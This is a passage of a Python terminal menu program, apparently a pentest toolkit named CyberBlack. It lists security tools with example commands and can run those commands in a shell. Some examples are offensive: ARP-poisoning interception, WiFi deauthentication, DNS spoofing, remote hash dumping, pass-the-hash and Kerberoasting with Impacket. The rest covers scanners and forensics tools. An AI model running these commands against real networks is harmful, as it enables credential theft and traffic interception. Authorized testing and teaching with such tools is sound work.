                  ("Network discovery","net.probe on\nnet.show"),
                  ("ARP poisoning MITM","set arp.spoof.targets 192.168.1.100\narp.spoof on\nnet.sniff on"),
                  ("WiFi recon","wifi.recon on\nwifi.show"),
                  ("Deauth client","wifi.deauth AA:BB:CC:DD:EE:FF"),
                  ("DNS spoof","set dns.spoof.domains target.com\ndns.spoof on")],
     "tips":["echo 1 > /proc/sys/net/ipv4/ip_forward before MITM",
             "Caplet files (.cap) automate multi-step attack workflows",
             "Much more powerful than ettercap — active community"]},
   ]},

  {"id":"8","name":"Post-Exploitation","icon":"🏴","color":"bright_red",
   "desc":"Privilege escalation, lateral movement, AD attacks, enumeration",
   "tools":[

    {"name":"Impacket","binary":"impacket-secretsdump",
     "tagline":"Windows Protocol Attack Toolkit",
     "desc":"Python toolkit implementing various Windows protocols. Includes secretsdump (hash extraction), psexec, smbexec, wmiexec, and more.",
     "install":"sudo apt install python3-impacket -y","risk":"Critical",
     "syntax":"impacket-<tool> [options]",
     "flags":[("impacket-secretsdump","Dump SAM/NTDS hashes remotely"),
               ("impacket-psexec","PSExec — get shell via SMB"),
               ("impacket-smbexec","SMB command execution"),
               ("impacket-wmiexec","WMI command execution"),
               ("impacket-GetUserSPNs","Kerberoasting — get service tickets"),
               ("impacket-lookupsid","Enumerate SIDs/users")],
     "examples":[("Dump hashes (admin creds)","impacket-secretsdump admin:password@192.168.1.1"),
                  ("Dump with hash (PTH)","impacket-secretsdump -hashes :NTLM_HASH admin@192.168.1.1"),
                  ("PSExec shell","impacket-psexec admin:password@192.168.1.1"),
                  ("Kerberoasting","impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.1 -request"),
                  ("SMB exec","impacket-smbexec admin:password@192.168.1.1")],
     "tips":["Pass-the-Hash: use -hashes :NTLM_HASH to auth without plaintext password",
             "Kerberoasting extracts service tickets crackable offline with hashcat -m 13100",
             "secretsdump is the fastest way to dump all hashes on a Windows target"]},

     ]},

  {"id":"9","name":"Vulnerability Assessment","icon":"🛡️","color":"bright_green",
   "desc":"Automated scanning, compliance auditing, CVE detection, hardening",
   "tools":[
    {"name":"OpenVAS / GVM","binary":"gvm-start",
     "tagline":"Open Vulnerability Assessment System (90,000+ NVTs)",
     "desc":"World's most comprehensive free vulnerability scanner. 90,000+ network vulnerability tests. Web-based UI for enterprise vulnerability management.",
     "install":"sudo apt install openvas -y && sudo gvm-setup","risk":"Medium",
     "syntax":"sudo gvm-start  → browse to https://127.0.0.1:9392",
     "flags":[("gvm-start","Start all GVM services"),("gvm-stop","Stop all services"),
               ("gvm-check-setup","Verify installation"),("Web UI","https://127.0.0.1:9392")],
     "examples":[("Initial setup (first time only)","sudo gvm-setup"),
                  ("Start GVM","sudo gvm-start"),
                  ("Check setup","sudo gvm-check-setup"),
                  ("Create scan in UI","# Scans → Tasks → New Task → Set target → Start"),
                  ("View reports","# Scans → Reports → Click report → Export PDF")],
     "tips":["Initial setup takes 30-60 min for NVT sync — be patient",
             "Use 'Full and fast' scan config for comprehensive coverage",
             "Export PDF reports for professional vulnerability assessments"]},

    {"name":"Lynis","binary":"lynis",
     "tagline":"Linux/Unix Security Auditing & Hardening Tool",
     "desc":"Security auditing for UNIX/Linux. Tests 300+ security controls: file perms, authentication, network, logging, software updates, CIS compliance.",
     "install":"sudo apt install lynis -y","risk":"Low",
     "syntax":"lynis [command] [options]",
     "flags":[("audit system","Full system security audit"),("--quick","No pauses between sections"),
               ("--pentest","Non-privileged pentest mode"),("--no-colors","Disable colors")],
     "examples":[("Full system audit","sudo lynis audit system"),
                  ("Quick audit","sudo lynis audit system --quick"),
                  ("Pentest mode (no root)","lynis audit system --pentest"),
                  ("Save report","sudo lynis audit system --report-file /tmp/lynis.dat"),
                  ("Check hardening score","sudo lynis audit system --quick | grep 'Hardening index'")],
     "tips":["Hardening Index: score out of 100 — aim for 80+ in production",
             "WARNINGS = important findings, SUGGESTIONS = improvements",
             "Run after every major system change to track security posture"]},

    {"name":"Nuclei","binary":"nuclei",
     "tagline":"Fast Template-Based Vulnerability Scanner (9000+ Templates)",
     "desc":"Community-driven vulnerability scanner. 9000+ YAML templates covering CVEs, misconfigurations, exposed panels. Blazing fast.",
     "install":"sudo apt install nuclei -y 2>/dev/null || sudo snap install nuclei 2>/dev/null || (sudo apt install -y golang-go && go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && sudo cp ~/go/bin/nuclei /usr/local/bin/)","risk":"Medium",
     "syntax":"nuclei -u <target> [options]",
     "flags":[("-u <url>","Target URL"),("-l <file>","Target list"),("-tags <tags>","Filter by tag: cve, rce, sqli"),
               ("-severity <s>","Filter: critical, high, medium"),("-o <file>","Output file"),("-ut","Update templates")],
     "examples":[("Basic scan","nuclei -u http://target.com"),
                  ("CVE only","nuclei -u http://target.com -tags cve"),
                  ("Critical + high","nuclei -u http://target.com -severity critical,high"),
                  ("RCE templates","nuclei -u http://target.com -tags rce"),
                  ("Update + scan","nuclei -ut && nuclei -u http://target.com"),
                  ("Pipe from subfinder","subfinder -d target.com -silent | nuclei -tags cve")],
     "tips":["Update templates regularly: nuclei -ut",
             "Combine: subfinder → httpx → nuclei for full automated recon",
             "Write custom YAML templates for company-specific checks"]},

    {"name":"Nmap Vuln Scripts","binary":"nmap",
     "tagline":"NSE Vulnerability Detection — Built into Nmap",
     "desc":"Nmap's 600+ NSE scripts include vulnerability detection for EternalBlue, Heartbleed, ShellShock, SMB, SSL issues and much more.",
     "install":"sudo apt install nmap -y","risk":"Medium",
     "syntax":"nmap --script=<script> [options] <target>",
     "flags":[("--script=vuln","Run ALL vulnerability scripts"),("--script=smb-vuln-*","All SMB vulnerabilities"),
               ("--script=ssl-*","All SSL/TLS checks"),("--script=http-vuln-*","HTTP vulnerability checks"),
               ("--script-help=<name>","Show script documentation")],
     "examples":[("All vuln scripts","sudo nmap --script=vuln 192.168.1.1"),
                  ("EternalBlue check","sudo nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.1"),
                  ("Heartbleed OpenSSL","sudo nmap --script=ssl-heartbleed -p 443 192.168.1.1"),
                  ("All SMB vulns","sudo nmap --script=smb-vuln-* -p 139,445 192.168.1.1"),
                  ("SSL cipher check","sudo nmap --script=ssl-enum-ciphers -p 443 192.168.1.1"),
                  ("FTP anonymous","sudo nmap --script=ftp-anon -p 21 192.168.1.1")],
     "tips":["NSE scripts at /usr/share/nmap/scripts/ — grep for keywords",
             "EternalBlue found → use exploit/windows/smb/ms17_010_eternalblue in MSF",
             "Specific scripts are faster and less noisy than --script=vuln (all)"]},
   ]},

  {"id":"10","name":"Forensics & Analysis","icon":"🔬","color":"bright_white",
   "desc":"Memory forensics, file carving, firmware analysis, metadata, digital forensics",
   "tools":[
  
    {"name":"Binwalk","binary":"binwalk",
     "tagline":"Firmware & Binary Analysis Tool",
     "desc":"Analyzes and extracts firmware images and embedded files. Used for IoT device firmware analysis, embedded Linux extraction.",
     "install":"sudo apt install binwalk -y","risk":"Low",
     "syntax":"binwalk [options] <file>",
     "flags":[("-e","Extract detected files/filesystems"),("-E","Entropy analysis (detect encryption/compression)"),
               ("-A","Scan for executable code"),("-M","Recursive extraction"),
               ("-dd '<sig>:<ext>'","Extract specific signature type")],
     "examples":[("Analyze firmware","binwalk firmware.bin"),
                  ("Extract embedded files","binwalk -e firmware.bin"),
                  ("Recursive extraction","binwalk -Me firmware.bin"),
                  ("Entropy analysis","binwalk -E firmware.bin"),
                  ("Scan for executable code","binwalk -A firmware.bin")],
     "tips":["Extracted files go to _<filename>.extracted/ directory",
             "High entropy regions = compressed/encrypted data",
             "After extraction: look for etc/passwd, configuration files, hardcoded creds"]},

    {"name":"Foremost","binary":"foremost",
     "tagline":"File Carving & Data Recovery Tool",
     "desc":"Recovers files from disk images or memory dumps based on headers/footers. Recovers deleted JPEG, PDF, ZIP, EXE, MP4, and many more.",
     "install":"sudo apt install foremost -y","risk":"Low",
     "syntax":"foremost [options] -i <inputfile>",
     "flags":[("-i <file>","Input file / disk image"),("-o <dir>","Output directory"),
               ("-t <types>","File types to recover: jpg, pdf, zip, exe, all"),
               ("-c <conf>","Configuration file"),("-v","Verbose output")],
     "examples":[("Recover all file types","foremost -i disk.img -o recovered/"),
                  ("Recover JPEGs only","foremost -t jpg -i disk.img -o recovered/"),
                  ("Recover from /dev","sudo foremost -i /dev/sdb -o recovered/"),
                  ("Multiple types","foremost -t jpg,pdf,zip -i dump.dd -o output/")],
     "tips":["Works on raw disk images, memory dumps, and even live devices",
             "Output directory contains audit.txt — check for found files summary",
             "Use with dd: dd if=/dev/sdb of=disk.img bs=512 then run foremost"]},

    {"name":"Exiftool","binary":"exiftool",
     "tagline":"Metadata Extractor — Images, PDFs, Documents",
     "desc":"Reads, writes, and edits metadata in images, audio, video, PDFs, Word docs. Reveals camera info, GPS coordinates, author, software, creation dates.",
     "install":"sudo apt install libimage-exiftool-perl -y","risk":"Low",
     "syntax":"exiftool [options] <file>",
     "flags":[("-a","Show all duplicate tags"),("-u","Show unknown/undocumented tags"),
               ("-G","Show group names"),("-csv","CSV output"),
               ("-delete_all","Remove all metadata"),("-GPS*","GPS-related tags only")],
     "examples":[("Read all metadata","exiftool image.jpg"),
                  ("GPS coordinates","exiftool -GPS* image.jpg"),
                  ("Bulk analyze directory","exiftool /path/to/directory/"),
                  ("CSV output","exiftool -csv *.jpg > metadata.csv"),
                  ("Remove all metadata","exiftool -delete_all file.jpg"),
                  ("Find images with GPS","exiftool -r -if '$GPSLatitude' /path/to/photos/")],
     "tips":["GPS in EXIF = exact location where photo was taken",
             "Author/Software fields reveal tools used — useful in forensics",
             "Remove metadata before sharing sensitive documents: -delete_all flag"]},

    {"name":"Autopsy","binary":"autopsy",
     "tagline":"Digital Forensics Platform (GUI)",
     "desc":"Full digital forensics platform. Analyzes disk images, file recovery, keyword search, browser history, email extraction, timeline analysis.",
     "install":"sudo apt install autopsy -y","risk":"Low",
     "syntax":"autopsy  (browser-based GUI at http://localhost:9999/autopsy)",
     "flags":[("New Case","Create new forensic investigation case"),
               ("Add Host","Add target host to case"),("Add Image","Add disk image for analysis"),
               ("Analyze","Run all analysis modules")],
     "examples":[("Start Autopsy","sudo autopsy"),
                  ("Access GUI","# Browse to http://localhost:9999/autopsy"),
                  ("Create disk image (before autopsy)","sudo dd if=/dev/sdb of=disk.img bs=4096 status=progress"),
                  ("Hash verification","md5sum disk.img > disk.img.md5")],
     "tips":["Always create MD5/SHA256 hash of evidence BEFORE analysis (chain of custody)",
             "dd command to image a drive: sudo dd if=/dev/sdb of=evidence.img bs=4096",
             "Autopsy module 'Interesting Files' is best starting point for quick analysis"]},
   ]},
]

# ═══════════════════ UTILITY FUNCTIONS ═══════════════════════════════════════

def clear():
    os.system('clear')

def check_tool(binary):
    return shutil.which(binary) is not None

def status_badge(binary):
    if check_tool(binary):
        return "[bold bright_green]✅ INSTALLED[/bold bright_green]"
    return "[bold red]❌ NOT INSTALLED[/bold red]"

def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "N/A"

def fmt_bytes(n):
    for unit in ['B','KB','MB','GB']:
        if n < 1024:
            return f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"

# ═══════════════════ BANNER ═══════════════════════════════════════════════════

def show_banner():
    banner = """
[bold cyan] ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗ ██╗      █████╗  ██████╗██╗  ██╗[/bold cyan]
[bold cyan]██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝[/bold cyan]
[bold cyan]██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██████╔╝██║     ███████║██║     █████╔╝ [/bold cyan]
[bold cyan]██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ [/bold cyan]
[bold cyan]╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗[/bold cyan]
[bold cyan] ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝[/bold cyan]"""
    console.print(banner)
    info = Table(box=box.SIMPLE, show_header=False, padding=(0,1))
    info.add_column(style="bold cyan"); info.add_column(style="white")
    info.add_row("Version","2.0.0  |  Advanced Cybersecurity Terminal Toolkit")
    info.add_row("Platform", f"{platform.system()} {platform.release()}")
    info.add_row("Your IP", local_ip())
    info.add_row("Date", datetime.now().strftime("%Y-%m-%d  %H:%M:%S"))
    info.add_row("Scope", "SOC Analyst · Pentester · CEH · OSCP · eJPT · OSINT")
    console.print(Align.center(info))
    console.print()
    console.print(Panel("[bold red]⚠  LEGAL:[/bold red] For [bold]AUTHORIZED TESTING & EDUCATION ONLY[/bold]. "
                        "Always get written permission before testing any system.",
                        style="red", padding=(0,2)))
    console.print()

# ═══════════════════ MAIN MENU ════════════════════════════════════════════════

def show_main_menu():
    clear()
    show_banner()
    t = Table(title="[bold cyan]★  SELECT A CATEGORY  ★[/bold cyan]",
              box=box.DOUBLE_EDGE, border_style="cyan",
              title_style="bold cyan", padding=(0,1), show_lines=True)
    t.add_column("ID",    style="bold yellow",    width=4,  justify="center")
    t.add_column("Icon",  width=4,                justify="center")
    t.add_column("Category",  style="bold white", width=30)
    t.add_column("Description", style="dim white", width=42)
    for cat in CATEGORIES:
        installed = sum(1 for tool in cat["tools"] if check_tool(tool["binary"]))
        total = len(cat["tools"])
        badge = f"[green]{installed}/{total}[/green]"
        t.add_row(cat["id"], cat["icon"],
                  f"[{cat['color']}]{cat['name']}[/{cat['color']}] {badge}",
                  cat["desc"])
    t.add_row("N", "📊", "[bold green]Network Monitor[/bold green]", "Real-time monitor your own device's network traffic")
    t.add_row("C", "✅", "[bold yellow]Check Installed Tools[/bold yellow]", "See which tools are installed / missing")
    t.add_row("0", "🚪", "[bold red]Exit[/bold red]", "Quit CyberBlack")
    console.print(Align.center(t))
    console.print()

# ═══════════════════ CATEGORY MENU ════════════════════════════════════════════

def show_category_menu(cat):
    clear()
    hdr = Table(box=box.SIMPLE, show_header=False, padding=(0,1))
    hdr.add_column(style=f"bold {cat['color']}"); hdr.add_column(style="white")
    hdr.add_row(f"{cat['icon']}  {cat['name']}", cat['desc'])
    console.print(Panel(hdr, border_style=cat['color']))
    t = Table(box=box.ROUNDED, border_style=cat['color'], padding=(0,1), show_lines=True)
    t.add_column("ID",     style="bold yellow", width=4, justify="center")
    t.add_column("Tool",   style="bold white",  width=22)
    t.add_column("Tagline", style="dim white",  width=44)
    t.add_column("Risk",    width=10, justify="center")
    t.add_column("Status",  width=14, justify="center")
    for i, tool in enumerate(cat["tools"], 1):
        rc = RISK_COLOR.get(tool["risk"], "white")
        t.add_row(str(i), tool["name"], tool["tagline"],
                  f"[{rc}]{tool['risk']}[/{rc}]", status_badge(tool["binary"]))
    t.add_row("0", "[dim]Back[/dim]", "", "", "")
    console.print(t)
    console.print()

# ═══════════════════ TOOL DETAIL VIEW ════════════════════════════════════════

def show_tool_detail(tool, cat_color="cyan"):
    clear()
    rc = RISK_COLOR.get(tool["risk"], "white")
    console.print(Panel(
        f"[bold white]{tool['name']}[/bold white]  —  [italic]{tool['tagline']}[/italic]\n"
        f"[dim]{tool['desc']}[/dim]",
        title=f"[bold {cat_color}]TOOL INFO[/bold {cat_color}]",
        border_style=cat_color))

    meta = Table(box=box.SIMPLE, show_header=False, padding=(0,1))
    meta.add_column(style="bold cyan", width=16); meta.add_column(style="white")
    meta.add_row("Risk Level",  f"[{rc}]{tool['risk']}[/{rc}]")
    meta.add_row("Status",      status_badge(tool["binary"]))
    meta.add_row("Install",     f"[yellow]{tool['install']}[/yellow]")
    meta.add_row("Syntax",      f"[green]{tool['syntax']}[/green]")
    console.print(meta)
    console.print(Rule(style="dim"))

    # FLAGS TABLE
    console.print(f"\n[bold yellow]  ⚑  KEY FLAGS & OPTIONS[/bold yellow]")
    ft = Table(box=box.SIMPLE, padding=(0,1), show_header=True)
    ft.add_column("Flag",    style="bold green",  width=28)
    ft.add_column("Description", style="white",  width=52)
    for flag, desc in tool["flags"]:
        ft.add_row(flag, desc)
    console.print(ft)
    console.print(Rule(style="dim"))

    # EXAMPLES TABLE
    console.print(f"\n[bold yellow]  ▶  USAGE EXAMPLES[/bold yellow]")
    et = Table(box=box.SIMPLE, padding=(0,1), show_header=True)
    et.add_column("#",   style="bold yellow",  width=4, justify="right")
    et.add_column("Description", style="bold white", width=28)
    et.add_column("Command", style="bold green", width=52)
    for i, (desc, cmd) in enumerate(tool["examples"], 1):
        et.add_row(str(i), desc, cmd)
    console.print(et)
    console.print(Rule(style="dim"))

    # PRO TIPS
    console.print(f"\n[bold yellow]  💡  PRO TIPS[/bold yellow]")
    for tip in tool["tips"]:
        console.print(f"   [cyan]•[/cyan] {tip}")
    console.print()

    # ACTION MENU
    console.print(Panel(
        "[bold yellow][R][/bold yellow] Run command   "
        "[bold yellow][E][/bold yellow] Run an example   "
        "[bold yellow][I][/bold yellow] Install tool   "
        "[bold yellow][B][/bold yellow] Back",
        border_style="dim"))

# ═══════════════════ TOOL RUNNER ═════════════════════════════════════════════

def run_command(cmd):
    console.print(f"\n[bold green]❯[/bold green] Running: [yellow]{cmd}[/yellow]\n")
    console.print(Rule("OUTPUT", style="green"))
    try:
        result = subprocess.run(cmd, shell=True)
        if result.returncode != 0:
            console.print(f"\n[yellow]↳ Exited with code {result.returncode}[/yellow]")
    except KeyboardInterrupt:
        console.print("\n[yellow]↳ Interrupted by user (Ctrl+C)[/yellow]")
    console.print(Rule(style="green"))
    input("\n  Press ENTER to continue...")

def tool_action_loop(tool, cat_color):
    while True:
        show_tool_detail(tool, cat_color)
        choice = Prompt.ask("[bold cyan]Action[/bold cyan]", default="b").strip().lower()
        if choice == "b":
            break
        elif choice == "r":
            cmd = Prompt.ask("\n[bold green]Enter command to run[/bold green]")
            run_command(cmd)
        elif choice == "e":
            console.print("\n[bold yellow]Select example number:[/bold yellow]")
            for i, (desc, cmd) in enumerate(tool["examples"], 1):
                console.print(f"  [yellow]{i}[/yellow]. {desc}")
            try:
                n = int(Prompt.ask("Example #")) - 1
                if 0 <= n < len(tool["examples"]):
                    ex_cmd = tool["examples"][n][1]
                    console.print(f"\n[dim]Command: {ex_cmd}[/dim]")
                    confirm = Prompt.ask("Run this command? [Y/n]", default="y").lower()
                    if confirm == "y":
                        run_command(ex_cmd)
            except (ValueError, IndexError):
                console.print("[red]Invalid selection.[/red]")
                time.sleep(1)
        elif choice == "i":
            run_command(f"echo '--- Installing {tool['name']} ---' && {tool['install']}")
        else:
            console.print("[red]Unknown action.[/red]")
            time.sleep(0.5)

# ═══════════════════ CHECK INSTALLED TOOLS ════════════════════════════════════

def check_installed_tools():
    clear()
    console.print(Panel("[bold yellow]✅  TOOL INSTALLATION STATUS[/bold yellow]", border_style="yellow"))
    for cat in CATEGORIES:
        t = Table(title=f"{cat['icon']} {cat['name']}", box=box.SIMPLE, padding=(0,1),
                  title_style=f"bold {cat['color']}")
        t.add_column("Tool", style="white", width=20)
        t.add_column("Binary", style="dim", width=20)
        t.add_column("Status", width=16, justify="center")
        t.add_column("Install", style="dim yellow", width=38)
        for tool in cat["tools"]:
            t.add_row(tool["name"], tool["binary"], status_badge(tool["binary"]), tool["install"])
        console.print(t)
    input("\n  Press ENTER to return to menu...")

# ═══════════════════ NETWORK MONITOR ══════════════════════════════════════════

def network_monitor():
    clear()
    console.print(Panel("[bold green]📊  LIVE NETWORK MONITOR — YOUR DEVICE[/bold green]\n"
                        "[dim]Ctrl+C to stop[/dim]", border_style="green"))
    try:
        prev = psutil.net_io_counters(pernic=True)
        while True:
            time.sleep(1)
            clear()
            now = datetime.now().strftime("%H:%M:%S")
            console.print(Panel(f"[bold green]📊  NETWORK MONITOR[/bold green]   [dim]{now}  |  Ctrl+C to stop[/dim]",
                                 border_style="green"))

            # ── INTERFACES ──
            curr = psutil.net_io_counters(pernic=True)
            addrs = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            it = Table(title="[bold cyan]Network Interfaces[/bold cyan]", box=box.ROUNDED,
                       border_style="cyan", padding=(0,1))
            it.add_column("Interface",  style="bold white", width=12)
            it.add_column("IPv4",       style="yellow",     width=18)
            it.add_column("MAC",        style="dim",        width=20)
            it.add_column("▼ Recv",     style="bright_green", width=14, justify="right")
            it.add_column("▲ Sent",     style="bright_red",   width=14, justify="right")
            it.add_column("▼ Rate",     style="bold green",   width=14, justify="right")
            it.add_column("▲ Rate",     style="bold red",     width=14, justify="right")
            it.add_column("Up",         width=5, justify="center")
            for iface, ctr in curr.items():
                ipv4 = mac = "—"
                for a in addrs.get(iface, []):
                    if str(a.family) in ('AddressFamily.AF_INET','2'):   ipv4 = a.address
                    if str(a.family) in ('AddressFamily.AF_PACKET','17'): mac = a.address
                p = prev.get(iface)
                rb_s = fmt_bytes(ctr.bytes_recv - p.bytes_recv) + "/s" if p else "—"
                sb_s = fmt_bytes(ctr.bytes_sent - p.bytes_sent) + "/s" if p else "—"
                up = "[green]●[/green]" if stats.get(iface, None) and stats[iface].isup else "[red]○[/red]"
                it.add_row(iface, ipv4, mac,
                           fmt_bytes(ctr.bytes_recv), fmt_bytes(ctr.bytes_sent),
                           rb_s, sb_s, up)
            console.print(it)
            prev = curr

            # ── CONNECTIONS ──
            conns = psutil.net_connections(kind='inet')
            active = [c for c in conns if c.status == 'ESTABLISHED']
            ct = Table(title=f"[bold cyan]Active Connections ({len(active)})[/bold cyan]",
                       box=box.SIMPLE, padding=(0,1))
            ct.add_column("PID",   style="yellow",       width=8,  justify="right")
            ct.add_column("Proto", style="dim",          width=7)
            ct.add_column("Local",  style="white",       width=24)
            ct.add_column("Remote", style="bright_cyan", width=24)
            ct.add_column("Status", style="bright_green",width=14)
            for c in active[:15]:
                laddr = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "—"
                raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "—"
                proto = "TCP" if c.type == 1 else "UDP"
                ct.add_row(str(c.pid or "—"), proto, laddr, raddr, c.status or "—")
            if len(active) > 15:
                ct.add_row("...", "...", f"... {len(active)-15} more ...", "", "")
            console.print(ct)

            # ── LISTENING PORTS ──
            listening = [c for c in conns if c.status == 'LISTEN']
            lt = Table(title=f"[bold yellow]Listening Ports ({len(listening)})[/bold yellow]",
                       box=box.SIMPLE, padding=(0,1))
            lt.add_column("Port",  style="bold yellow", width=8,  justify="right")
            lt.add_column("PID",   style="dim",         width=8,  justify="right")
            lt.add_column("Address", style="white",     width=20)
            for c in listening[:10]:
                lt.add_row(str(c.laddr.port if c.laddr else "—"),
                           str(c.pid or "—"),
                           str(c.laddr.ip if c.laddr else "—"))
            console.print(lt)

            # ── SYSTEM INFO ──
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory()
            console.print(
                f"  [bold]CPU[/bold] [cyan]{cpu:5.1f}%[/cyan]  "
                f"[bold]RAM[/bold] [cyan]{ram.percent:5.1f}%[/cyan]  "
                f"[bold]Local IP[/bold] [yellow]{local_ip()}[/yellow]  "
                f"[bold]Hostname[/bold] [white]{socket.gethostname()}[/white]"
            )
    except KeyboardInterrupt:
        console.print("\n[yellow]Network monitor stopped.[/yellow]")
        time.sleep(1)

# ═══════════════════ MAIN NAVIGATION LOOP ════════════════════════════════════

def category_loop(cat):
    while True:
        show_category_menu(cat)
        choice = Prompt.ask("[bold cyan]Select tool[/bold cyan]", default="0").strip()
        if choice == "0":
            break
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(cat["tools"]):
                tool_action_loop(cat["tools"][idx], cat["color"])
            else:
                console.print("[red]Invalid selection.[/red]")
                time.sleep(0.8)
        except ValueError:
            console.print("[red]Please enter a number.[/red]")
            time.sleep(0.8)

def main():
    while True:
        show_main_menu()
        choice = Prompt.ask("[bold cyan]Select category[/bold cyan]", default="0").strip().lower()
        if choice == "0":
            clear()
            console.print("\n[bold cyan]  Thank you for using CyberBlack. Stay ethical. Stay legal. 🛡️[/bold cyan]\n")
            break
        elif choice == "n":
            network_monitor()
        elif choice == "c":
            check_installed_tools()
        else:
            cat = next((c for c in CATEGORIES if c["id"] == choice), None)
            if cat:
                category_loop(cat)
            else:
                console.print("[red]Invalid selection — enter 1-10, N, C, or 0.[/red]")
                time.sleep(0.8)

if __name__ == "__main__":
    main()
